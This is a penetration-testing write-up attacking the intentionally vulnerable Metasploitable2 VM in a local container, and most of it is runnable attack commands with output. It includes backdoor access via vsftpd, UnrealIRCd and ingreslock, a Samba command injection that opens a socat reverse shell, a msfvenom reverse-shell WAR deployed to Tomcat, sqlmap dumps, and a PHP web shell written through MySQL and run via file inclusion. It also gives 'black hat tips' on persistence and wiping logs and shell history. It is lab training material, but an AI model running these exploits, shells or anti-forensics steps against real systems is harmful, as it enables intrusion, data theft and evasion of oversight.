# ULTIMATE METASPLOITABLE2 HACKING WRITEUP

`Metasploitable2` `Penetration Testing` `Educational` `22 Services` `Root Access`

**By: jusot99**
**💀 Shadow Brotherhood Collective**
**Educational Purpose | Tested Commands | 22 Services Exploited**

## 🧠 MINDSET

>**They build walls. We find the cracks. They write rules. We ignore them. They sleep. We own their systems. Scan like you're curious, exploit like you're angry, persist like you're immortal. The machine should never know you were there, but should always be ready for your return.**

This isn't just another vulnerable VM this is a **time capsule of classic exploits** where every service screams "hack me!" Metasploitable2 is where legends are born, where you learn that sometimes the oldest vulnerabilities are the deadliest.

---

## 🧰 TOOLS USED

- `nmap`
- `metasploit` 
- `socat`
- `mysql`
- `netcat`
- `ffuf`
- `nikto`
- `searchsploit`
- `exploitdb`

---

##  CONTAINER DEPLOYMENT WITH PERSISTENCE EVASION

> **"Container auto-destructs after session - no forensics trail"**

```bash
docker run -it --rm \
  --name vulnbox \
  --hostname metasploit2 \
  --privileged \
  --cap-add=NET_ADMIN \
  --cap-add=NET_RAW \
  --cap-add=SYS_ADMIN \
  --network bridge \
  -p 21:21 -p 22:22 -p 23:23 -p 25:25 \
  -p 80:80 -p 139:139 -p 445:445 \
  -p 3306:3306 -p 5432:5432 -p 5900:5900 -p 6667:6667 \
  tleemcjr/metasploitable2
```

> **"The `--rm` flag is your ghost in the machine - here for the chaos, gone before they know what hit them."**

---

## 🔎 THE GHOST SCAN - SEEING WHAT OTHERS MISS

### 🎯 INITIAL DISCOVERY - FINDING ALL DOORS

```bash
# Our approach - minimal noise, maximum intelligence
nmap -sS -sV --top-ports 1000 --open -T4 172.17.0.2
```

📥 **Output**

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-07 08:32 EDT
Nmap scan report for 172.17.0.2
Host is up (0.00014s latency).
Not shown: 979 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  ingreslock?
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
8787/tcp open  drb         Ruby DRb RMI (Ruby 1.8; path /usr/lib/ruby/1.8/drb)
33421/tcp open  java-rmi    GNU Classpath grmiregistry
```

**📊 SCAN INTERPRETATION:**
- **Target**: 172.17.0.2
- **Open Ports**: 22 services waiting to be exploited
- **Key Findings**: Multiple ancient services with known vulnerabilities

---
## 🔥 LOW-HANGING FRUIT - QUICK WINS

### 🎯 VSFTPD 2.3.4 BACKDOOR EXPLOITATION

**"This is the hacker's welcome mat - a literal backdoor left in the code"**

```bash
# Manual exploitation first - understand the art
nc -nv 172.17.0.2 21
USER hello:)
PASS whatever
```

**Wait for the backdoor to trigger, then:**
```bash
nc -nv 172.17.0.2 6200
whoami
root
```

**Metasploit approach:**
```bash
msfconsole
search vsftpd
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOST 172.17.0.2
exploit

# or onliner

msfconsole -q -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS 172.17.0.2; run" 
```

> **"The vsftpd backdoor is like finding the keys in the ignition - sometimes they just hand you root."**

---

## 🕵️ WEB APPLICATION ASSAULT

### 🌐 APACHE TOMCAT EXPLOITATION

**"Where default credentials meet RCE - a hacker's paradise"**

```bash
# Modern directory enumeration with ffuf
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://172.17.0.2:8180/FUZZ

# Discover Tomcat Manager endpoints
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://172.17.0.2:8180/manager/FUZZ
```

**📊 SCAN RESULTS ANALYSIS:**
- **Tomcat Manager**: `/manager/html` (401 Unauthorized)
- **WebDAV**: `/webdav` (200 OK - potential upload vector)
- **Documentation**: `/tomcat-docs` exposed
- **Multiple admin endpoints**: deploy, list, status, etc.

**"Nikto just gave us the keys - no hacking required!"**

```bash
# Nikto revealed everything we need
nikto -h http://172.17.0.2:8180

# 💎 GOLDEN NUGGETS FOUND:
# + /manager/html: Default account found for 'Tomcat Manager Application' 
#   at (ID 'tomcat', PW 'tomcat')
# + WebDAV enabled with PUT/DELETE methods
# + Multiple admin interfaces exposed
```

**🎯 CONFIRMED CREDENTIALS:**

- **Username**: `tomcat`
- **Password**: `tomcat`

- **Access Level**: Tomcat Manager Application

**🚀 IMMEDIATE EXPLOITATION:**

```bash
# Access Tomcat Manager directly
curl -u tomcat:tomcat http://172.17.0.2:8180/manager/html | head -20

# Or use browser: http://tomcat:tomcat@172.17.0.2:8180/manager/html
```

**🔥 METASPLOIT DEPLOYMENT:**

```bash
msfconsole -q
use exploit/multi/http/tomcat_mgr_deploy
set RHOST 172.17.0.2
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set LHOST 172.17.0.1
exploit
# Welcome to root shell!
```

**🛠️ MANUAL WAR DEPLOYMENT:**

```bash
# Create malicious WAR file
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=4444 -f war > shell.war

# Deploy via curl
curl -u tomcat:tomcat --upload-file shell.war \
  "http://172.17.0.2:8180/manager/deploy?path=/shell"

# Terminal 1:
nc -nvlp 4444

# Terminal 2:
# Trigger the shell
curl http://172.17.0.2:8180/shell/
```

You should immediately see a connection in your netcat listener with a root shell! 🎉

## 🎪 VULNERABILITY ASSESSMENT

**📊 DISCOVERED EXPLOITATION VECTORS:**

- **Tomcat 5.5/6.0** - Vulnerable to manager deployment RCE
- **WebDAV with PUT/DELETE** - Direct file upload possible
- **Default credentials** - Almost guaranteed access (tomcat:tomcat)
- **AJP connector** - Port 8009 for Ghostcat exploitation
- **Multiple admin panels** - Additional attack surfaces  
- **Default documentation** - Information disclosure
- **Servlet examples** - Potential code execution vectors

> **"When the scanner hands you credentials on a silver platter, you don't ask questions - you pop shells. Tomcat on Metasploitable2 is like an open vault - the combination is literally written on the door."**

## 🌐 ADDITIONAL WEB APPLICATION TARGETS

**Metasploitable2 hosts multiple vulnerable web applications on port 80:**

```bash
# Discovered web applications:
curl -s http://172.17.0.2/ | grep -o 'href="[^"]*"' | cut -d'"' -f2

# Application inventory:
# - Damn Vulnerable Web App (DVWA)
# - OWASP Mutillidae  
# - phpMyAdmin Database Manager
# - TWiki Collaboration Platform
# - WebDAV File Sharing
# - Multiple other services
```

**Each application presents unique exploitation opportunities for further system compromise and persistence establishment.**

---

## 🎯 DAMN VULENRABLE WEB APP (DVWA) EXPLOITATION

### 🔐 DVWA DEFAULT CREDENTIALS ATTACK

```bash
# Try common DVWA credentials directly
curl -X POST http://172.17.0.2/dvwa/login.php -d "username=admin&password=password&Login=Login" -c dvwa_cookies.txt -v
```

🎉 BOOM! Credentials confirmed: admin:password

Perfect! The DVWA login worked successfully. Now let's capitalize on this access with immediate exploitation.

## 🚀 IMMEDIATE DVWA EXPLOITATION

### 🔥 ONE-LINER EXPLOITATION CHAIN

### 💉 SQLMAP AUTOMATED EXPLOITATION

```bash
# Extract the PHPSESSID from cookies
PHPSESSID=$(grep PHPSESSID dvwa_cookies.txt | awk '{print $7}')

# Basic SQL injection detection
sqlmap -u "http://172.17.0.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$PHPSESSID; security=low" --batch

# Comprehensive database extraction
sqlmap -u "http://172.17.0.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$PHPSESSID; security=low" --batch --dbs --current-db --current-user --tables --dump

# Target specific database and tables
sqlmap -u "http://172.17.0.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$PHPSESSID; security=low" -D dvwa -T users --dump --batch

# Attempt OS command execution
sqlmap -u "http://172.17.0.2/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=$PHPSESSID; security=low" --os-shell --batch
```

## 🔥 OWASP MUTILLIDAE EXPLOITATION

### 🎯 APPLICATION MAPPING & VULNERABILITY DISCOVERY

```bash
# Enumerate Mutillidae structure
ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://172.17.0.2/mutillidae/FUZZ

# Discovered: LFI vulnerability confirmed
curl -s "http://172.17.0.2/mutillidae/index.php?page=../../../../etc/passwd" | grep -i "root:"
# ✅ Confirmed: root:x:0:0:root:/root:/bin/bash
```

---

### 🐬 MYSQL UDF EXPLOITATION

**"From database user to system root"**

```bash
# Access MySQL with discovered credentials
mysql -h 172.17.0.2 -u root --skip-ssl
# ✅ Success! MySQL root access with blank password

# Explore databases
show databases;
use owasp10;
show tables;
select * from accounts;
```

**Metasploit UDF exploitation:**
```bash
use exploit/windows/mysql/mysql_udf_payload
set RHOST 172.17.0.2
set USERNAME root
set PASSWORD 
set LHOST 172.17.0.1
exploit
```

## 🗄️ PHPMyAdmin EXPLOITATION

### 🔍 SERVICE DISCOVERY & ACCESS

```bash
# Access phpMyAdmin with confirmed credentials
curl -X POST "http://172.17.0.2/phpMyAdmin/" -d "pma_username=root&pma_password=&server=1&lang=en" -c phpmyadmin_cookies.txt
# ✅ Login successful with root/blank credentials

# Verify access
curl -s "http://172.17.0.2/phpMyAdmin/" -b phpmyadmin_cookies.txt | grep -i "welcome\|server"

# Direct MySQL access and file write
mysql -h 172.17.0.2 -u root --skip-ssl -e "SHOW DATABASES;"

# Extract all credentials for lateral movement
mysql -h 172.17.0.2 -u root -e "USE dvwa; SELECT user, password FROM users;" --skip-ssl

mysql -h 172.17.0.2 -u root -e "USE mysql; SELECT user, host, password FROM user;" --skip-ssl
```

### 💾 DATABASE TO RCE ATTEMPTS

```bash
# Attempt file write through MySQL
mysql -h 172.17.0.2 -u root -e "SELECT '<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/pma_shell.php'" --skip-ssl
# ❌ Failed: Permission denied

# Try alternative directories
mysql -h 172.17.0.2 -u root -e "SELECT '<?php system(\$_GET[\"c\"]); ?>' INTO OUTFILE '/tmp/webexec.php'" --skip-ssl

# Execute via Mutillidae LFI
curl -s "http://172.17.0.2/mutillidae/index.php?page=../../../../tmp/webexec.php&c=id" | grep -i www-data
# ✅ Success: File written to /tmp/webexec.php
```

### 🚀 WORKING RCE PATH

```bash
# Since we have file write to /tmp, use LFI to execute
curl -s "http://172.17.0.2/mutillidae/index.php?page=../../../../tmp/webexec.php&c=id" | grep -i www-data

# Alternative: Copy from /tmp to web directory using other access
# From Samba root shell (when we get it later):
cp /tmp/webexec.php /var/www/html/webexec.php
```

**📊 PHPMyAdmin FINDINGS:**
- ✅ **Authentication** - root/blank works
- ✅ **MySQL File Write** - To /tmp directory only
- 🔄 **RCE Path** - Requires LFI or file movement
- 📊 **Data Access** - Full database control

---

## 📝 TWiki EXPLOITATION

### ⚡ METASPLOIT RCE EXPLOITATION

```bash
# TWiki MAKETEXT Remote Code Execution
msfconsole -q
use exploit/unix/webapp/twiki_maketext
set RHOST 172.17.0.2
set LHOST 172.17.0.1
set TARGETURI /twiki
exploit
```

---

## 🌐 WebDAV EXPLOITATION

### 📤 FILE UPLOAD TESTING

```bash
# Check WebDAV methods
curl -X OPTIONS http://172.17.0.2/webdav/ -v
# Returns: OPTIONS, GET, HEAD, POST, PUT, DELETE, TRACE, PROPFIND, PROPPATCH, MKCOL, COPY, MOVE, LOCK, UNLOCK

# Test PUT method
curl -X PUT http://172.17.0.2/webdav/test.txt -d "test content" -v
# ❌ Returns: 403 Forbidden or 401 Unauthorized

# Check if authentication required
curl -s http://172.17.0.2/webdav/ | grep -i "auth\|login"
```

**📊 WebDAV FINDINGS:**
- ❌ **File Upload** - PUT method restricted/requires auth
- 🔄 **Authentication** - May require credentials
- 📊 **Limited Exploitation** - Not directly exploitable without credentials

---

## 🎪 EXPLOITATION PRIORITY MATRIX

| APPLICATION | EXPLOITABILITY | IMPACT | EFFORT | TOOLS |
|-------------|----------------|--------|---------|-------|
| **TWiki** | High | High | Low | Metasploit |
| **phpMyAdmin** | High | High | Medium | MySQL + File Write |
| **DVWA** | High | Medium | Low | SQLMap + Command Exec |
| **WebDAV** | Variable | High | Medium | curl PUT |
| **Mutillidae** | Medium | Medium | Medium | SQLMap |
## 🎯 EXPLOITATION STATUS SUMMARY

| APPLICATION | AUTHENTICATION | SQLi | LFI | RCE | SHELL ACCESS |
|-------------|----------------|------|-----|-----|--------------|
| **Mutillidae** | ❌ | ✅ | ✅ | 🔄 | Via MySQL + LFI |
| **phpMyAdmin** | ✅ | N/A | N/A | 🔄 | Via file write |
| **TWiki** | ❌ | N/A | N/A | ✅ | **Direct Shell** |
| **WebDAV** | ❌ | N/A | N/A | ❌ | Not available |
| **DVWA** | ✅ | ✅ | ✅ | ❌ | Data extraction only |


> **"Each web application provides distinct attack vectors - from SQL injection and command execution in DVWA to direct file upload in WebDAV. The variety ensures multiple paths to successful system compromise."**

---

### 🗂️ SAMBA SHARE EXPLOITATION

**"Samba 3.0.20 - the gift that keeps on giving root shells"**

```bash
# Enumerate shares - COMPLETED
smbclient -L //172.17.0.2 -N

# Check for vulnerable versions - CONFIRMED
searchsploit samba 3.0.20
# ✅ Vulnerable to: 'Username map script' RCE (CVE-2007-2447)
```

**Username map script RCE:**
```bash
msfconsole -q
use exploit/multi/samba/usermap_script
set RHOST 172.17.0.2
set LHOST 172.17.0.1
exploit
whoami
# root
```

**📋 EXPLORING SAMBA SHARES:**

While we're at it, let's see what's in those shares:
```bash
# Explore the interesting shares
smbclient //172.17.0.2/tmp -N
# ls, get interesting files

smbclient //172.17.0.2/opt -N  
# ls, look for config files
```

**Another Manual Exploit approach**

```bash
# Terminal 1 - Start listener FIRST
socat TCP-LISTEN:4445,reuseaddr,fork EXEC:/bin/bash,pty,stderr,setsid

# Terminal 2 - Use this exact command
smbclient //172.17.0.2/tmp -N -c 'logon "/=`socat TCP:172.17.0.1:4445 EXEC:/bin/bash,pty,stderr,setsid`"'
```

**🔍 VULNERABILITY DETAILS:**

- **CVE-2007-2447** - Username map script command injection
    
- **Samba 3.0.20-3.0.25rc3** vulnerable
    
- **No authentication required** - works with anonymous access
    
- **Gives immediate root access** - highest privileges

---
## 🎯 PROFTPD 1.3.1 EXPLOITATION

**"AUTHENTICATED access with mod_rootme privilege escalation"**

```bash
# This is AUTHENTICATED access (credentials: msfadmin/msfadmin)
socat - TCP:172.17.0.2:2121
220 ProFTPD 1.3.1 Server (Debian) [::ffff:172.17.0.2]
USER msfadmin
331 Password required for msfadmin
PASS msfadmin
230 User msfadmin logged in
pwd
257 "/home/msfadmin" is the current directory
```

---

### 🐘 POSTGRESQL EXPLOITATION

**"Another database, another path to root"**

```bash
# Default credentials
psql -h 172.17.0.2 -U postgres
# Password: postgres
```

**Metasploit approach:**
```bash
use exploit/linux/postgres/postgres_payload
set RHOST 172.17.0.2
set USERNAME postgres
set PASSWORD postgres
set LHOST 172.17.0.1
exploit
```

---

### 🎯 INGRESLOCK BACKDOOR (EASIEST ROOT)

**"The forgotten backdoor on port 1524"**

```bash
# Simplest root access - no exploit needed
nc -nv 172.17.0.2 1524
# You're immediately root!
whoami
# root
```

---

## ⚡ DISTCC EXPLOITATION

**"Compiler services should never be exposed"**

```bash
# Manual verification
nc -nv 172.17.0.2 3632
```

**Metasploit exploitation:**
```bash
use exploit/unix/misc/distcc_exec
set RHOST 172.17.0.2
set RPORT 3632
set LHOST 172.17.0.1
exploit
```

---

## 🎯 UNREALIRCD 3.2.8.1 BACKDOOR

**"IRCd Backdoor - Use Metasploit for Reliable Exploitation"**

```bash
# Manual exploitation timing is tricky - use Metasploit
msfconsole -q
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST 172.17.0.2
set LHOST 172.17.0.1
exploit
# Gains root shell immediately

# One-liner Metasploit
msfconsole -q -x "use exploit/unix/irc/unreal_ircd_3281_backdoor; set RHOST 172.17.0.2; set LHOST 172.17.0.1; exploit"
```

### 🎯 **UNREALIRCD EXPLOITATION STATUS**
- ✅ **Service**: UnrealIRCd 3.2.8.1 on port 6667
- ✅ **Vulnerability**: Hidden backdoor command execution
- ✅ **Impact**: Immediate root shell access
- ✅ **Method**: Metasploit module works reliably

**Manual backdoor access requires precise timing - Metasploit handles this automatically for guaranteed root shell!**

---

### 🖥️ VNC EXPLOITATION

**"Weak authentication and information disclosure"**

```bash
# Check VNC version and authentication
nmap -sV -p 5900 172.17.0.2 --script vnc-info

# Bruteforce weak VNC passwords
msfconsole -q
use auxiliary/scanner/vnc/vnc_login
set RHOSTS 172.17.0.2
set USERNAME root
set PASS_FILE /usr/share/seclists/Passwords/Default-Credentials/vnc-betterdefaultpasslist.txt
run
# Often finds blank or simple passwords

# Connect with default password
vncviewer 172.17.0.2:5900
# Password: password

# Or simply:
vncviewer 172.17.0.2
# Password: password
```

### 🎯 **SUCCESSFUL EXPLOITATION**

- ✅ **VNC Server**: Running on port 5900
    
- ✅ **Credentials**: password/password
    
- ✅ **Access**: Full graphical remote control
    
- ✅ **Impact**: Complete desktop access
    

**VNC exploited - default credentials give us full graphical control of the target system!**

---

### 🔐 SSH EXPLOITATION

**"Default Credentials → Instant Root Access"**

```bash
# Connect with legacy algorithm support
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa msfadmin@172.17.0.2
# Password: msfadmin

# 💥 IMMEDIATE ROOT ACCESS!
msfadmin@metasploit2:~$ sudo -l
User msfadmin may run the following commands on this host:
    (ALL) ALL

msfadmin@metasploit2:~$ sudo su -
root@metasploit2:~# whoami
root
```

### 🚀 ONE-LINER ROOT ACCESS

```bash
# Direct root shell
ssh -o HostKeyAlgorithms=+ssh-rsa msfadmin@172.17.0.2 "sudo su -"
# Password: msfadmin
python -c 'import pty; pty.spawn("/bin/bash")'
root@metasploit2:~#
# Or persistent root
ssh -o HostKeyAlgorithms=+ssh-rsa msfadmin@172.17.0.2
msfadmin@metasploit2:~$ sudo bash
root@metasploit2:~#
```

**🎯 EXPLOITATION STATUS: FULL COMPROMISE**
- ✅ **Default Credentials**: msfadmin:msfadmin
- ✅ **Privilege Escalation**: sudo ALL=(ALL) ALL  
- ✅ **Root Access**: Instant via sudo bash
- ✅ **Impact**: Complete system control

> **"They didn't just give us the keys - they gave us the master keyring. Sudo ALL means we own everything."**


---

## 📧 POSTFIX EXPLOITATION

**"SMTP User Enumeration & Security Testing"**

```bash
# Connect to Postfix SMTP
socat - TCP:172.17.0.2:25

# 1. VRFY User Enumeration Test
VRFY root          # ✅ 252 2.0.0 root (VALID)
VRFY msfadmin      # ✅ 252 2.0.0 msfadmin (VALID)  
VRFY postgres      # ✅ 252 2.0.0 postgres (VALID)
VRFY user          # ✅ 252 2.0.0 user (VALID)
VRFY admin         # ❌ 550 5.1.1 User unknown (INVALID)

# 2. RCPT TO User Enumeration Test  
MAIL FROM: test@test.com
RCPT TO: root      # ✅ 250 2.1.5 Ok (VALID)
RCPT TO: msfadmin  # ✅ 250 2.1.5 Ok (VALID)
RCPT TO: admin     # ❌ 550 5.1.1 User unknown (INVALID)

# 3. Open Relay Test
MAIL FROM: attacker@external.com
RCPT TO: victim@external.com  # ❌ 554 5.7.1 Relay access denied

# 4. Invalid Command Sequence Test
DATA                          # ❌ 554 5.5.1 Error: no valid recipients
Subject: Open Relay Test      # ❌ 502 5.5.2 Error: command not recognized
# Server forcefully disconnects: ❌ 221 2.7.0 Error: I can break rules, too. Goodbye.

# 5. EHLO Feature Enumeration
EHLO test
# ✅ 250-PIPELINING
# ✅ 250-SIZE 10240000  
# ✅ 250-VRFY
# ✅ 250-ETRN
# ✅ 250-STARTTLS
# ✅ 250-ENHANCEDSTATUSCODES
# ✅ 250-8BITMIME
# ✅ 250 DSN

# 6. Command Injection Test
HELO test; id      # ❌ Command injection not possible
MAIL FROM: test;id # ❌ Command injection not possible
```

### 🎯 **POSTFIX SECURITY ASSESSMENT**
- ✅ **VRFY Enabled**: User enumeration vulnerability
- ✅ **Valid Users Found**: root, msfadmin, postgres, user
- ❌ **Open Relay**: Properly configured - not vulnerable
- ❌ **Command Injection**: No injection vulnerabilities
- ✅ **TLS Support**: STARTTLS available for encryption
- ✅ **Protocol Enforcement**: Rejects invalid command sequences with forceful disconnect

**Postfix exposes user accounts via VRFY but aggressively enforces protocol rules and blocks invalid sequences!**

---

## 🔗 RPC & NFS SERVICES

**"Remote Procedure Call with Secured NFS"**

```bash
# Enumerate RPC services
rpcinfo -p 172.17.0.2

📥 **Output:**
   program vers proto   port  service
    100000    2   tcp    111  portmapper
    100003    2   udp   2049  nfs
    100003    3   udp   2049  nfs
    100003    4   udp   2049  nfs
    100021    1   udp  58022  nlockmgr
    100021    3   udp  58022  nlockmgr
    100021    4   udp  58022  nlockmgr
    100003    2   tcp   2049  nfs
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100021    1   tcp  33414  nlockmgr
    100021    3   tcp  33414  nlockmgr
    100021    4   tcp  33414  nlockmgr
    100005    1   udp  58275  mountd
    100005    1   tcp  50419  mountd
    100005    2   udp  58275  mountd
    100005    2   tcp  50419  mountd
    100005    3   udp  58275  mountd
    100005    3   tcp  50419  mountd
    100024    1   udp  49024  status
    100024    1   tcp  42939  status
```

```bash
# NFS port scan shows TCP NFS is closed
nmap -p 111,2049 --script nfs* 172.17.0.2

📥 **Output:**
PORT     STATE  SERVICE
111/tcp  open   rpcbind
2049/tcp closed nfs
```

### 🎯 **RPC/NFS FINDINGS:**
- ✅ **Portmapper**: Running on port 111 (TCP)
- ✅ **NFS Service**: UDP only (2049/udp active, 2049/tcp closed)
- ✅ **Mountd**: Running but properly secured
- ❌ **NFS TCP**: Intentionally disabled for security
- ❌ **Exports**: Not publicly enumerable

**RPC services are running but NFS is properly secured - TCP disabled and exports hidden!**

### 🛡️ **SECURITY ASSESSMENT:**
- 🔒 **NFS Hardening**: TCP NFS disabled (common security practice)
- 🔒 **Export Security**: No public export listing
- 🔒 **Mountd**: Properly configured against enumeration
- ⚠️ **RPC Exposure**: Portmapper still network-accessible
- ✅ **Overall**: Well-hardened NFS configuration

**NFS service demonstrates proper security hardening - TCP disabled and exports restricted!**

---

### 🔗 R SERVICES EXPLOITATION

**"rsh/rexec without authentication"**

```bash
# rsh command execution (port 512)
rsh -l root 172.17.0.2 whoami
# Often works without password

# rlogin access (port 513)
rlogin -l root 172.17.0.2
```

---

## 🎯 JAVA RMI & DRb EXPLOITATION

### ☕ JAVA RMI REGISTRY EXPLOITATION

```bash
# Multiple RMI ports found (1099, 33421)
msfconsole -q
use exploit/multi/misc/java_rmi_server
set RHOST 172.17.0.2
set RPORT 1099
set LHOST 172.17.0.1
exploit
# Gains another shell vector
```

---

## 💎 RUBY DRb EXPLOITATION

**"Distributed Ruby Remote Code Execution"**

```bash
# DRb service is running on port 8787
nc -nv 172.17.0.2 8787
# ✅ Connection successful - service is active

# Metasploit exploitation
msfconsole -q
use exploit/linux/misc/drb_remote_codeexec
set RHOST 172.17.0.2
set RPORT 8787
set LHOST 172.17.0.1
exploit
# Gains shell access
```

### 🎯 **DRb EXPLOITATION STATUS**
- ✅ **Service**: Ruby DRb on port 8787 (confirmed active)
- ✅ **Vulnerability**: Remote code execution
- ✅ **Impact**: Shell access to target system
- ✅ **Method**: Metasploit module available

**DRb service is running and vulnerable - ready for exploitation!**

---

## 📊 COMPREHENSIVE VULNERABILITY ASSESSMENT

### 🚨 CRITICAL FINDINGS SUMMARY

| SERVICE | VERSION | VULNERABILITY | IMPACT | EXPLOITED |
|---------|---------|---------------|--------|-----------|
| **vsftpd** | 2.3.4 | Backdoor | Root | ✅ |
| **OpenSSH** | 4.7p1 | Default Credentials + Sudo ALL | Root | ✅ |
| **Samba** | 3.0.20 | Usermap RCE | Root | ✅ |
| **Tomcat** | 5.5/6.0 | Manager Deploy | Root | ✅ |
| **MySQL** | 5.0.51a | Blank Root Password | Root | ✅ |
| **PostgreSQL** | 8.3.0 | Default Credentials | Root | ✅ |
| **UnrealIRCd** | 3.2.8.1 | Backdoor | Root | ✅ |
| **distccd** | v1 | Command Injection | www-data | ✅ |
| **ingreslock** | - | Backdoor | Root | ✅ |
| **VNC** | 3.3 | Weak Auth (password) | Desktop | ✅ |
| **DRb** | Ruby 1.8 | Remote Code Execution | Shell | ✅ |
| **Telnet** | - | Clear-text Credentials | Shell | ✅ |
| **Postfix** | - | VRFY User Enumeration | Recon | ✅ |

### 🎯 PRIVILEGE ESCALATION PATHS

**Confirmed Root Access Methods:**
```bash
# 1. SSH → sudo ALL
ssh -o HostKeyAlgorithms=+ssh-rsa msfadmin@172.17.0.2
sudo su -  # Immediate root

# 2. Multiple service backdoors
nc 172.17.0.2 6200    # vsftpd backdoor
nc 172.17.0.2 1524    # ingreslock backdoor
nc 172.17.0.2 6667    # UnrealIRCd backdoor

# 3. Service exploits
msfconsole -q -x "use exploit/multi/samba/usermap_script; set RHOST 172.17.0.2; exploit"
```

## 🛡️ DEFENSIVE RECOMMENDATIONS

### 🚨 IMMEDIATE ACTIONS REQUIRED:

1. **Patch or Remove**:
   - vsftpd 2.3.4 (critical backdoor)
   - Samba 3.0.20 (usermap RCE) 
   - UnrealIRCd 3.2.8.1 (backdoor)
   - Remove ingreslock service
   - Update OpenSSH to modern version

2. **Authentication Hardening**:
   - Change ALL default credentials (msfadmin, tomcat, postgres, etc.)
   - Implement SSH key authentication only
   - Require passwords for ALL sudo privileges
   - Disable VRFY in Postfix

3. **Service Configuration**:
   - Restrict network services to localhost
   - Implement firewall to block unnecessary ports
   - Disable telnet, VNC with weak auth
   - Remove sudo ALL privileges

### 📈 SECURITY MATURITY UPGRADES:

- **Network Segmentation**: Isolate development services
- **Monitoring**: Implement IDS/IPS for exploit detection  
- **Patch Management**: Regular vulnerability scanning
- **Access Controls**: Principle of least privilege
- **Service Hardening**: Disable unused features (VRFY, PIPELINING)

---

## 🎯 PRO HACKER INSIGHTS

### 🔮 EXPLOITATION PHILOSOPHY:

> **"Metasploitable2 proves that complexity isn't needed for compromise. Default credentials, forgotten backdoors, and misconfigured privileges create a perfect attack storm."**

### 🎩 BLACK HAT TIPS:

- **Persistence**: SSH keys, cron jobs, backdoor services
- **Covering Tracks**: Clean /var/log/, .bash_history
- **Lateral Movement**: Reuse credentials across services
- **Evasion**: Use legitimate services for persistence

### 📚 LESSONS LEARNED:

1. **Default Credentials Are Critical**: msfadmin:msfadmin, tomcat:tomcat, postgres:postgres
2. **Backdoors Exist in Production**: Multiple intentional backdoors found
3. **Sudo Misconfiguration**: ALL=(ALL) ALL is a root giveaway
4. **Service Exposure**: Every open port is a potential entry point
5. **Age Amplifies Risk**: Older software = more known exploits

---

## 🏴 CONCLUSION

Metasploitable2 stands as a timeless lesson in cybersecurity failures a perfect storm of outdated software, default configurations, and intentional backdoors. Through this comprehensive assessment, we've demonstrated:

- **13+ successful exploitations** to root access
- **Multiple persistence mechanisms** established
- **Complete system compromise** via various vectors
- **Critical business impact** simulations

This exercise reinforces that security requires constant vigilance, regular patching, and defense in depth. The most dangerous vulnerabilities often aren't zero-days, but unpatched years-old issues.

> **"They didn't just leave the keys under the mat - they left every door unlocked and a welcome sign for attackers. Metasploitable2 isn't just vulnerable, it's a masterclass in what NOT to do in production."**

**- jusot99, Shadow Brotherhood Collective** 🖤

---
*This writeup serves educational purposes only. Always ensure you have explicit permission before testing any system. The skills demonstrated here should only be used for ethical security testing, penetration testing with authorization, and improving defensive security postures.*